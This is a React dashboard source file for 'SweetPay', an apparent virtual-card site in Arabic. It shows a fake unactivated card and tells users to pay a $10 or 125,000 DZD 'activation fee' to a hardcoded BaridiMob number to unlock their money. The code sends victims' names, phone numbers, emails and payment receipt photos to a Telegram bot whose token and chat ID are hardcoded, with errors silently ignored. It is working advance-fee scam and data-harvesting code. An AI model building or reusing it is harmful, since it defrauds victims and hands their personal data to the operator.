import { useState, useRef } from 'react';
    import { useLocation } from 'wouter';
    import { useAuth } from '@/contexts/AuthContext';
    import { Button } from '@/components/ui/button';
    import { Input } from '@/components/ui/input';
    import { Label } from '@/components/ui/label';
    import { AlertTriangle, Copy, Check, CreditCard, LogOut, Upload, CheckCircle2, Pencil } from 'lucide-react';
    import { motion, AnimatePresence } from 'framer-motion';

    const BOT_TOKEN = '8439446538:AAE7qOmKwdw93kK7R9n4P2T21V7z2KcF-YI';
    const CHAT_ID = '5653032481';
    const ACTIVATION_PHONE = '004264907943';

    async function sendToTelegram(text: string, photo?: File) {
    try {
      if (photo) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('caption', text);
        fd.append('photo', photo);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
      } else {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' }),
        });
      }
    } catch {
      // silent
    }
    }

    export default function Dashboard() {
    const [, navigate] = useLocation();
    const { user, logout, updateCardName } = useAuth();
    const base = import.meta.env.BASE_URL?.replace(/\/$/, '') || '';

    const [editingName, setEditingName] = useState(false);
    const [nameInput, setNameInput] = useState('');
    const [copied, setCopied] = useState(false);
    const [payFirstName, setPayFirstName] = useState('');
    const [payLastName, setPayLastName] = useState('');
    const [payPhone, setPayPhone] = useState('');
    const [payTime, setPayTime] = useState('');
    const [payFile, setPayFile] = useState<File | null>(null);
    const [payFileName, setPayFileName] = useState('');
    const [sending, setSending] = useState(false);
    const [submitted, setSubmitted] = useState(false);
    const fileRef = useRef<HTMLInputElement>(null);

    if (!user) { navigate('/login'); return null; }

    const cardName = user.cardName || user.fullName;
    const cardLastFour = String(Math.abs(user.email.split('').reduce((a: number, c: string) => a + c.charCodeAt(0), 0) % 9000) + 1000);

    const handleCopy = () => {
      navigator.clipboard.writeText(ACTIVATION_PHONE);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    };

    const handleSaveName = () => {
      if (nameInput.trim().length >= 3) {
        updateCardName(nameInput.trim());
        setEditingName(false);
      }
    };

    const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      const f = e.target.files?.[0];
      if (f) { setPayFile(f); setPayFileName(f.name); }
    };

    const handlePaymentSubmit = async (e: React.FormEvent) => {
      e.preventDefault();
      setSending(true);
      const text = `🔔 <b>طلب تفعيل حساب — SweetPay</b>

    👤 <b>الاسم:</b> ${payFirstName} ${payLastName}
    📧 <b>البريد:</b> ${user.email}
    👤 <b>اسم المستخدم:</b> ${user.username}
    📞 <b>الهاتف:</b> ${payPhone}
    🕐 <b>وقت الدفع:</b> ${payTime}
    💳 <b>البطاقة:</b> **** ${cardLastFour} — ${cardName}`;
      await sendToTelegram(text, payFile ?? undefined);
      setSending(false);
      setSubmitted(true);
    };

    const handleLogout = () => { logout(); navigate('/'); };

    return (
      <div dir="rtl" className="min-h-screen bg-background">
        {!user.isActive && (
          <div className="bg-destructive text-destructive-foreground px-4 py-3 text-center text-sm font-semibold flex items-center justify-center gap-2 flex-wrap">
            <AlertTriangle size={16} className="shrink-0" />
            <span>الحساب غير مفعل — يجب تفعيله لسحب أموالك</span>
            <a href="#activate" className="underline font-bold hover:opacity-80 transition-opacity">← فعّل الآن</a>
          </div>
        )}

        <header className="border-b border-border bg-card/50 backdrop-blur-sm px-4 py-4">
          <div className="container mx-auto flex items-center justify-between">
            <a href={base + '/'} className="text-xl font-black text-foreground">Sweet<span className="text-primary">Pay</span></a>
            <div className="flex items-center gap-3">
              <span className="text-sm text-muted-foreground hidden sm:block">{user.username}</span>
              <Button variant="outline" size="sm" onClick={handleLogout} className="gap-2">
                <LogOut size={14} />خروج
              </Button>
            </div>
          </div>
        </header>

        <main className="container mx-auto px-4 py-8 max-w-2xl space-y-10">
          <div>
            <h1 className="text-2xl font-black text-foreground">مرحباً، {user.fullName.split(' ')[0]} 👋</h1>
            <p className="text-muted-foreground mt-1">هذه بطاقتك الافتراضية على SweetPay</p>
          </div>

          <div>
            <div
              className="relative rounded-3xl overflow-hidden select-none"
              style={{ background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 40%, #0f3460 70%, #533483 100%)', aspectRatio: '1.586', maxWidth: '420px' }}
            >
              <div className="absolute inset-0 opacity-20" style={{ background: 'radial-gradient(ellipse at 30% 20%, rgba(255,255,255,0.3) 0%, transparent 60%)' }} />
              <div className="absolute top-6 right-6">
                <div className="w-10 h-8 rounded-md border-2 border-yellow-400/60 bg-gradient-to-br from-yellow-300/40 to-yellow-600/40 flex items-center justify-center">
                  <div className="w-6 h-5 rounded-sm border border-yellow-300/40 grid grid-cols-2 gap-px">
                    <div className="bg-yellow-400/30 rounded-tl-sm" /><div className="bg-yellow-400/30 rounded-tr-sm" />
                    <div className="bg-yellow-400/30 rounded-bl-sm" /><div className="bg-yellow-400/30 rounded-br-sm" />
                  </div>
                </div>
              </div>
              <div className="absolute top-6 left-6">
                <span className="text-white/80 font-black text-lg tracking-wider">Sweet<span className="text-yellow-400">Pay</span></span>
              </div>
              <div className="absolute" style={{ bottom: '38%', right: '6%', left: '6%' }}>
                <p className="text-white/60 font-mono text-base tracking-[0.3em]">**** **** **** {cardLastFour}</p>
              </div>
              <div className="absolute bottom-6 right-6 left-6 flex items-end justify-between">
                <div>
                  <p className="text-white/40 text-xs uppercase tracking-wider mb-1">Card Holder</p>
                  <p className="text-white font-bold text-sm tracking-wide uppercase">{cardName}</p>
                </div>
                <div className="text-right">
                  <p className="text-white/40 text-xs mb-1">Expires</p>
                  <p className="text-white/80 text-sm font-mono">{new Date(user.createdAt).getFullYear() + 3}/12</p>
                </div>
              </div>
              {!user.isActive && (
                <div className="absolute inset-0 flex items-center justify-center bg-black/30 backdrop-blur-[1px]">
                  <div className="bg-red-600/90 text-white px-6 py-2 rounded-full text-sm font-black uppercase tracking-widest rotate-[-12deg] shadow-2xl border-2 border-red-400">
                    غير مفعل
                  </div>
                </div>
              )}
            </div>
            <div className="mt-3 flex items-center gap-2">
              {editingName ? (
                <>
                  <Input value={nameInput} onChange={e => setNameInput(e.target.value)} placeholder="الاسم كما يظهر في البطاقة" className="flex-1 max-w-xs" />
                  <Button size="sm" onClick={handleSaveName}>حفظ</Button>
                  <Button size="sm" variant="ghost" onClick={() => setEditingName(false)}>إلغاء</Button>
                </>
              ) : (
                <button onClick={() => { setNameInput(cardName); setEditingName(true); }}
                  className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors">
                  <Pencil size={13} /><span>تعديل الاسم في البطاقة</span>
                </button>
              )}
            </div>
          </div>

          {!user.isActive && (
            <div id="activate" className="rounded-2xl border border-yellow-500/30 bg-yellow-500/5 p-6 space-y-5">
              <div className="flex items-start gap-3">
                <CreditCard size={22} className="text-yellow-500 mt-0.5 shrink-0" />
                <div>
                  <h2 className="text-lg font-black text-foreground">فعّل حسابك واسحب نقودك</h2>
                  <p className="text-muted-foreground text-sm mt-1">
                    لتفعيل بطاقتك الافتراضية وإمكانية سحب أموالك، أرسل رسوم التفعيل:
                    <span className="font-bold text-foreground"> 10 دولار </span>أو
                    <span className="font-bold text-foreground"> 125,000 دج</span>
                  </p>
                </div>
              </div>
              <div>
                <p className="text-sm font-semibold text-foreground mb-2">أرسل إلى هذا الرقم (بريدي موب):</p>
                <div className="flex items-center gap-2 bg-card border border-border rounded-xl p-3">
                  <span className="font-mono text-lg font-bold tracking-wider text-foreground flex-1">{ACTIVATION_PHONE}</span>
                  <Button variant="outline" size="sm" onClick={handleCopy} className="gap-2 shrink-0">
                    {copied ? <Check size={14} className="text-green-500" /> : <Copy size={14} />}
                    {copied ? 'تم النسخ' : 'نسخ'}
                  </Button>
                </div>
              </div>
              <AnimatePresence mode="wait">
                {submitted ? (
                  <motion.div key="done" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}
                    className="flex flex-col items-center gap-3 py-6 text-center">
                    <CheckCircle2 size={40} className="text-green-500" />
                    <p className="font-bold text-foreground text-lg">تم إرسال طلبك بنجاح!</p>
                    <p className="text-muted-foreground text-sm">سيتم مراجعة دفعتك وتفعيل حسابك قريباً.</p>
                  </motion.div>
                ) : (
                  <motion.form key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }} onSubmit={handlePaymentSubmit} className="space-y-4">
                    <div className="border-t border-border pt-4">
                      <p className="font-semibold text-foreground mb-3 text-sm">بعد الدفع، أرسل إثبات الدفع هنا:</p>
                      <div className="grid grid-cols-2 gap-3">
                        <div className="space-y-1">
                          <Label htmlFor="payFirst">الاسم</Label>
                          <Input id="payFirst" value={payFirstName} onChange={e => setPayFirstName(e.target.value)} required placeholder="محمد" />
                        </div>
                        <div className="space-y-1">
                          <Label htmlFor="payLast">اللقب</Label>
                          <Input id="payLast" value={payLastName} onChange={e => setPayLastName(e.target.value)} required placeholder="أمين" />
                        </div>
                      </div>
                      <div className="space-y-1 mt-3">
                        <Label htmlFor="payPhone">رقم الهاتف</Label>
                        <Input id="payPhone" value={payPhone} onChange={e => setPayPhone(e.target.value)} required placeholder="0550000000" type="tel" />
                      </div>
                      <div className="space-y-1 mt-3">
                        <Label htmlFor="payTime">وقت الدفع الفعلي</Label>
                        <Input id="payTime" value={payTime} onChange={e => setPayTime(e.target.value)} required type="datetime-local" />
                      </div>
                      <div className="space-y-1 mt-3">
                        <Label>صورة الريسيبت / إثبات الدفع</Label>
                        <div onClick={() => fileRef.current?.click()}
                          className="border-2 border-dashed border-border rounded-xl p-4 text-center cursor-pointer hover:border-primary/50 hover:bg-primary/5 transition-colors">
                          {payFileName ? (
                            <p className="text-sm font-semibold text-foreground truncate">{payFileName}</p>
                          ) : (
                            <div className="flex flex-col items-center gap-2 text-muted-foreground">
                              <Upload size={20} /><span className="text-sm">اضغط لرفع صورة الدفع</span>
                            </div>
                          )}
                          <input ref={fileRef} type="file" accept="image/*" className="hidden" onChange={handleFileChange} />
                        </div>
                      </div>
                      <Button type="submit" className="w-full mt-4 font-bold" disabled={sending}>
                        {sending ? 'جاري الإرسال...' : 'إرسال إثبات الدفع ←'}
                      </Button>
                    </div>
                  </motion.form>
                )}
              </AnimatePresence>
            </div>
          )}

          {user.isActive && (
            <div className="rounded-2xl border border-green-500/30 bg-green-500/5 p-5 flex items-center gap-3">
              <CheckCircle2 size={24} className="text-green-500 shrink-0" />
              <div>
                <p className="font-bold text-foreground">حسابك مفعّل ✓</p>
                <p className="text-sm text-muted-foreground">بطاقتك جاهزة ويمكنك الاستفادة من الخدمة.</p>
              </div>
            </div>
          )}
        </main>
      </div>
    );
    }
    